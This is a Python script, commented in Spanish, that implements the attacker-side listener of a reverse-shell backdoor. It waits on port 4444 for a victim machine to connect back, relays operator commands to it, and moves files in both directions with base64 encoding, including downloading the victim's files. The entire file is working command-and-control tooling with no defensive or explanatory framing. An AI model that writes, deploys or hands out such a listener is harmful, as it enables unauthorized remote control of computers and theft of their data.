import socket
import json
import base64

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Esperando conexiones...")
        self.connection, address = listener.accept()
        print("[+] Conexión establecida desde " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def escribir_archivo(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Descarga finalizada con éxito."

    def leer_archivo(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    def ejecutar_remoto(self, command):
        self.reliable_send(command)
        if command[0] == "salir":
            self.connection.close()
            exit()
        return self.reliable_receive()

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")
            
            try:
                if command[0] == "subir":
                    content = self.leer_archivo(command[1])
                    command.append(content)

                result = self.ejecutar_remoto(command)

                if command[0] == "descargar" and "[-] Error" not in result:
                    result = self.escribir_archivo(command[1], result)
            except Exception as e:
                result = "[-] Error durante la operación: " + str(e)

            print(result)

# Ejecución: Listener("TU_IP", PUERTO)
escucha = Listener("0.0.0.0", 4444)
escucha.run()
